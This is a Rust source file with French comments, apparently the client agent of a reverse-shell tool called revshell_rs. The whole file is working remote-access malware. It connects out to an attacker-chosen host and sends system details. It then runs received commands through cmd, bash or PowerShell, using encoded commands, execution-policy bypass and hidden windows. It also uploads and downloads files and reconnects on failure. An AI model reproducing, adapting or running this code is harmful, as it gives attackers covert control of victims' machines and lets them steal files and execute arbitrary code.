use revshell_rs::*;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::{Duration, Instant};

// ═══════════════════════════════════════════════════════════
// SLEEP — busy-wait
// ═══════════════════════════════════════════════════════════

fn delay_ms(ms: u64) {
    let target = Instant::now() + Duration::from_millis(ms);
    while Instant::now() < target {
        std::hint::spin_loop();
    }
}

// ═══════════════════════════════════════════════════════════
// SHELL STATE — gère CMD vs PowerShell
// ═══════════════════════════════════════════════════════════

struct ShellState {
    /// Sur Windows : "cmd" ou "powershell"
    /// Sur Linux : toujours le shell détecté
    shell: String,
}

impl ShellState {
    fn new() -> Self {
        #[cfg(target_os = "windows")]
        {
            ShellState {
                shell: "cmd".into(),
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            let sh = if std::path::Path::new("/bin/bash").exists() {
                "/bin/bash"
            } else {
                "/bin/sh"
            };
            ShellState {
                shell: sh.into(),
            }
        }
    }

    /// Retourne true si la commande est un switch de shell (géré en interne)
    fn handle_switch(&mut self, cmd: &str) -> Option<String> {
        #[cfg(target_os = "windows")]
        {
            let lower = cmd.trim().to_lowercase();
            if lower == "powershell" || lower == "powershell.exe" {
                self.shell = "powershell".into();
                return Some("Switched to PowerShell\n".into());
            }
            if lower == "cmd" || lower == "cmd.exe" {
                self.shell = "cmd".into();
                return Some("Switched to CMD\n".into());
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            let _ = cmd; // Linux n'a pas de switch CMD/PS
        }
        None
    }

    fn build_command(&self, cmd: &str) -> (String, Vec<String>) {
        #[cfg(target_os = "windows")]
        {
            if self.shell == "powershell" {
                // Encode en base64 pour éviter les problèmes d'échappement
                let utf16: Vec<u8> = cmd
                    .encode_utf16()
                    .flat_map(|c| c.to_le_bytes())
                    .collect();
                let b64 = base64_encode(&utf16);
                (
                    "powershell.exe".into(),
                    vec![
                        "-NoProfile".into(),
                        "-NonInteractive".into(),
                        "-ExecutionPolicy".into(),
                        "Bypass".into(),
                        "-EncodedCommand".into(),
                        b64,
                    ],
                )
            } else {
                ("cmd.exe".into(), vec!["/C".into(), cmd.into()])
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            (self.shell.clone(), vec!["-c".into(), cmd.into()])
        }
    }
}

/// Base64 minimal — pas de dépendance externe
#[cfg(target_os = "windows")]
fn base64_encode(input: &[u8]) -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity((input.len() + 2) / 3 * 4);
    for chunk in input.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };
        let triple = (b0 << 16) | (b1 << 8) | b2;
        out.push(CHARS[((triple >> 18) & 0x3F) as usize] as char);
        out.push(CHARS[((triple >> 12) & 0x3F) as usize] as char);
        if chunk.len() > 1 {
            out.push(CHARS[((triple >> 6) & 0x3F) as usize] as char);
        } else {
            out.push('=');
        }
        if chunk.len() > 2 {
            out.push(CHARS[(triple & 0x3F) as usize] as char);
        } else {
            out.push('=');
        }
    }
    out
}

// ═══════════════════════════════════════════════════════════
// PLATFORM EXEC — CreateProcessW (Windows) / fork (Linux)
// ═══════════════════════════════════════════════════════════

#[cfg(target_os = "windows")]
mod platform {
    use std::ptr;

    #[repr(C)]
    struct StartupInfoW {
        cb: u32,
        reserved: *mut u16,
        desktop: *mut u16,
        title: *mut u16,
        dw_x: u32,
        dw_y: u32,
        dw_x_size: u32,
        dw_y_size: u32,
        dw_x_count_chars: u32,
        dw_y_count_chars: u32,
        dw_fill_attribute: u32,
        dw_flags: u32,
        w_show_window: u16,
        cb_reserved2: u16,
        lp_reserved2: *mut u8,
        h_std_input: *mut core::ffi::c_void,
        h_std_output: *mut core::ffi::c_void,
        h_std_error: *mut core::ffi::c_void,
    }

    #[repr(C)]
    struct ProcessInformation {
        h_process: *mut core::ffi::c_void,
        h_thread: *mut core::ffi::c_void,
        dw_process_id: u32,
        dw_thread_id: u32,
    }

    #[repr(C)]
    struct SecurityAttributes {
        n_length: u32,
        lp_security_descriptor: *mut core::ffi::c_void,
        b_inherit_handle: i32,
    }

    const STARTF_USESTDHANDLES: u32 = 0x00000100;
    const CREATE_NO_WINDOW: u32 = 0x08000000;
    const INFINITE: u32 = 0xFFFFFFFF;

    extern "system" {
        fn CreatePipe(
            h_read: *mut *mut core::ffi::c_void,
            h_write: *mut *mut core::ffi::c_void,
            attrs: *mut SecurityAttributes,
            size: u32,
        ) -> i32;
        fn CreateProcessW(
            app: *const u16,
            cmd: *mut u16,
            proc_attrs: *mut SecurityAttributes,
            thread_attrs: *mut SecurityAttributes,
            inherit: i32,
            flags: u32,
            env: *mut core::ffi::c_void,
            dir: *const u16,
            si: *mut StartupInfoW,
            pi: *mut ProcessInformation,
        ) -> i32;
        fn ReadFile(
            h: *mut core::ffi::c_void,
            buf: *mut u8,
            to_read: u32,
            read: *mut u32,
            overlapped: *mut core::ffi::c_void,
        ) -> i32;
        fn WaitForSingleObject(h: *mut core::ffi::c_void, ms: u32) -> u32;
        fn CloseHandle(h: *mut core::ffi::c_void) -> i32;
        fn SetHandleInformation(h: *mut core::ffi::c_void, mask: u32, flags: u32) -> i32;
        fn GetComputerNameW(buf: *mut u16, size: *mut u32) -> i32;
    }

    fn to_wide(s: &str) -> Vec<u16> {
        s.encode_utf16().chain(std::iter::once(0)).collect()
    }

    /// Exécute avec programme + arguments séparés
    pub fn exec_command_with_args(program: &str, args: &[String]) -> String {
        // Construire la command line Windows : "program" arg1 arg2 ...
        let mut cmdline = format!("\"{}\"", program);
        for a in args {
            // Si l'arg contient des espaces ou caractères spéciaux, quoter
            if a.contains(' ') || a.contains('"') {
                cmdline.push_str(&format!(" \"{}\"", a.replace('"', "\\\"")));
            } else {
                cmdline.push(' ');
                cmdline.push_str(a);
            }
        }

        let mut cmdline_w = to_wide(&cmdline);

        unsafe {
            let mut sa = SecurityAttributes {
                n_length: std::mem::size_of::<SecurityAttributes>() as u32,
                lp_security_descriptor: ptr::null_mut(),
                b_inherit_handle: 1,
            };

            let mut stdout_read: *mut core::ffi::c_void = ptr::null_mut();
            let mut stdout_write: *mut core::ffi::c_void = ptr::null_mut();

            if CreatePipe(&mut stdout_read, &mut stdout_write, &mut sa, 0) == 0 {
                return "error: pipe creation failed\n".into();
            }

            SetHandleInformation(stdout_read, 1, 0);

            let mut si: StartupInfoW = std::mem::zeroed();
            si.cb = std::mem::size_of::<StartupInfoW>() as u32;
            si.dw_flags = STARTF_USESTDHANDLES;
            si.h_std_output = stdout_write;
            si.h_std_error = stdout_write;

            let mut pi: ProcessInformation = std::mem::zeroed();

            let created = CreateProcessW(
                ptr::null(),
                cmdline_w.as_mut_ptr(),
                ptr::null_mut(),
                ptr::null_mut(),
                1,
                CREATE_NO_WINDOW,
                ptr::null_mut(),
                ptr::null(),
                &mut si,
                &mut pi,
            );

            CloseHandle(stdout_write);

            if created == 0 {
                CloseHandle(stdout_read);
                return "error: process creation failed\n".into();
            }

            WaitForSingleObject(pi.h_process, INFINITE);

            let mut output = Vec::new();
            let mut buf = [0u8; 4096];
            loop {
                let mut bytes_read: u32 = 0;
                let ok = ReadFile(
                    stdout_read,
                    buf.as_mut_ptr(),
                    buf.len() as u32,
                    &mut bytes_read,
                    ptr::null_mut(),
                );
                if ok == 0 || bytes_read == 0 {
                    break;
                }
                output.extend_from_slice(&buf[..bytes_read as usize]);
            }

            CloseHandle(pi.h_process);
            CloseHandle(pi.h_thread);
            CloseHandle(stdout_read);

            String::from_utf8_lossy(&output).to_string()
        }
    }

    pub fn get_hostname() -> String {
        unsafe {
            let mut buf = [0u16; 256];
            let mut size = buf.len() as u32;
            if GetComputerNameW(buf.as_mut_ptr(), &mut size) != 0 {
                let end = buf.iter().position(|&c| c == 0).unwrap_or(size as usize);
                String::from_utf16_lossy(&buf[..end])
            } else {
                std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".into())
            }
        }
    }
}

#[cfg(not(target_os = "windows"))]
mod platform {
    use std::process::{Command, Stdio};

    pub fn exec_command_with_args(program: &str, args: &[String]) -> String {
        match Command::new(program)
            .args(args)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .output()
        {
            Ok(o) => {
                let mut r = String::from_utf8_lossy(&o.stdout).to_string();
                let e = String::from_utf8_lossy(&o.stderr);
                if !e.is_empty() {
                    r.push_str(&e);
                }
                r
            }
            Err(e) => format!("exec error: {}\n", e),
        }
    }

    pub fn get_hostname() -> String {
        let mut buf = [0u8; 256];
        unsafe {
            extern "C" {
                fn gethostname(name: *mut u8, len: usize) -> i32;
            }
            if gethostname(buf.as_mut_ptr(), buf.len()) == 0 {
                let end = buf.iter().position(|&b| b == 0).unwrap_or(buf.len());
                String::from_utf8_lossy(&buf[..end]).to_string()
            } else {
                std::env::var("HOSTNAME").unwrap_or_else(|_| "unknown".into())
            }
        }
    }
}

// ═══════════════════════════════════════════════════════════
// TRANSFERT FICHIER — côté agent
// ═══════════════════════════════════════════════════════════

fn handle_upload(stream: &mut TcpStream, remote_path: &str) -> String {
    // Signaler qu'on est prêt
    if stream.write_all(FILE_OK).is_err() {
        return "error: ack failed\n".into();
    }

    // Recevoir taille
    let size = match recv_size(stream) {
        Ok(s) => s as usize,
        Err(e) => return format!("error: {}\n", e),
    };

    // Recevoir données
    let data = match read_exact_bytes(stream, size) {
        Ok(d) => d,
        Err(e) => return format!("error: {}\n", e),
    };

    // Écrire fichier
    match std::fs::write(remote_path, &data) {
        Ok(_) => format!("uploaded {} bytes → {}\n", size, remote_path),
        Err(e) => format!("error writing {}: {}\n", remote_path, e),
    }
}

fn handle_download(stream: &mut TcpStream, remote_path: &str) -> Result<(), String> {
    // Lire le fichier
    let data = match std::fs::read(remote_path) {
        Ok(d) => d,
        Err(e) => {
            // Envoyer erreur
            let msg = format!("error: {}\n", e);
            let _ = stream.write_all(FILE_ERR);
            let _ = stream.write_all(msg.as_bytes());
            let _ = stream.write_all(END_MARKER);
            return Ok(());
        }
    };

    // Envoyer FILE_BEGIN
    stream.write_all(FILE_BEGIN).map_err(|e| e.to_string())?;

    // Attendre ACK
    let mut ack = [0u8; 64];
    let n = stream.read(&mut ack).map_err(|e| e.to_string())?;
    if !contains_marker(&ack[..n], FILE_OK) {
        return Err("server not ready".into());
    }

    // Envoyer taille + données
    send_size(stream, data.len() as u64)?;
    stream.write_all(&data).map_err(|e| e.to_string())?;

    // Envoyer confirmation + END
    let msg = format!("sent {} bytes from {}\n", data.len(), remote_path);
    stream.write_all(msg.as_bytes()).map_err(|e| e.to_string())?;
    stream.write_all(END_MARKER).map_err(|e| e.to_string())?;

    Ok(())
}

// ═══════════════════════════════════════════════════════════
// SYSINFO
// ═══════════════════════════════════════════════════════════

fn gather_sysinfo() -> String {
    let user = std::env::var("USER")
        .or_else(|_| std::env::var("USERNAME"))
        .unwrap_or_else(|_| "?".into());
    let hostname = platform::get_hostname();
    let os = std::env::consts::OS;
    let arch = std::env::consts::ARCH;
    let cwd = std::env::current_dir()
        .map(|p| p.display().to_string())
        .unwrap_or_else(|_| "?".into());

    format!(
        "user={}\nhostname={}\nos={}\narch={}\ncwd={}\n",
        user, hostname, os, arch, cwd
    )
}

// ═══════════════════════════════════════════════════════════
// CD HANDLER
// ═══════════════════════════════════════════════════════════

fn handle_cd(path: &str) -> String {
    let target = path.trim();
    let target = if target.is_empty() || target == "~" {
        std::env::var("HOME")
            .or_else(|_| std::env::var("USERPROFILE"))
            .unwrap_or_else(|_| "/".into())
    } else {
        target.to_string()
    };
    match std::env::set_current_dir(&target) {
        Ok(_) => format!(
            "{}\n",
            std::env::current_dir()
                .map(|p| p.display().to_string())
                .unwrap_or_else(|_| "?".into())
        ),
        Err(e) => format!("cd: {}\n", e),
    }
}

// ═══════════════════════════════════════════════════════════
// SESSION PRINCIPALE
// ═══════════════════════════════════════════════════════════

fn run_session(host: &str, port: u16) -> Result<(), String> {
    let addr = format!("{}:{}", host, port);
    let mut stream = TcpStream::connect(&addr).map_err(|e| e.to_string())?;
    let _ = stream.set_read_timeout(Some(Duration::from_secs(600)));

    // Handshake
    stream.write_all(HANDSHAKE_REQ).map_err(|e| e.to_string())?;
    let mut hs = [0u8; 5];
    stream.read_exact(&mut hs).map_err(|e| e.to_string())?;
    if hs != HANDSHAKE_ACK {
        return Err("handshake rejected".into());
    }

    // Sysinfo
    let info = gather_sysinfo();
    stream.write_all(info.as_bytes()).map_err(|e| e.to_string())?;
    stream.write_all(END_MARKER).map_err(|e| e.to_string())?;

    // Shell state
    let mut shell = ShellState::new();

    // Command loop
    let mut buf = [0u8; BUF_SIZE];
    loop {
        let _ = stream.set_read_timeout(Some(Duration::from_secs(600)));
        let n = stream.read(&mut buf).map_err(|e| e.to_string())?;
        if n == 0 {
            return Err("disconnected".into());
        }

        let raw = String::from_utf8_lossy(&buf[..n]);
        let cmd = raw.trim();
        if cmd.is_empty() {
            continue;
        }

        // Exit
        if cmd == "exit" || cmd == "quit" {
            break;
        }

        // Upload (commande interne __upload)
        if cmd.starts_with("__upload ") {
            let remote_path = cmd.strip_prefix("__upload ").unwrap_or("").trim();
            let result = handle_upload(&mut stream, remote_path);
            let _ = stream.write_all(result.as_bytes());
            let _ = stream.write_all(END_MARKER);
            continue;
        }

        // Download (commande interne __download)
        if cmd.starts_with("__download ") {
            let remote_path = cmd.strip_prefix("__download ").unwrap_or("").trim();
            let _ = handle_download(&mut stream, remote_path);
            continue;
        }

        // CD
        if cmd == "cd" || cmd.starts_with("cd ") {
            let output = handle_cd(cmd.strip_prefix("cd").unwrap_or("").trim());
            stream.write_all(output.as_bytes()).map_err(|e| e.to_string())?;
            stream.write_all(END_MARKER).map_err(|e| e.to_string())?;
            continue;
        }

        // Shell switch (powershell / cmd)
        if let Some(msg) = shell.handle_switch(cmd) {
            stream.write_all(msg.as_bytes()).map_err(|e| e.to_string())?;
            stream.write_all(END_MARKER).map_err(|e| e.to_string())?;
            continue;
        }

        // Exécution commande
        let (program, args) = shell.build_command(cmd);
        let output = platform::exec_command_with_args(&program, &args);

        let out = if output.is_empty() {
            "(no output)\n".to_string()
        } else {
            output
        };

        stream.write_all(out.as_bytes()).map_err(|e| e.to_string())?;
        stream.write_all(END_MARKER).map_err(|e| e.to_string())?;
    }
    Ok(())
}

fn main() {
    let (host, port, _) = parse_args();
    let mut retries = 0u32;

    loop {
        match run_session(&host, port) {
            Ok(_) => break,
            Err(_) => {
                retries += 1;
                if retries >= MAX_RETRIES {
                    break;
                }
                delay_ms(RECONNECT_DELAY_MS);
            }
        }
    }
}
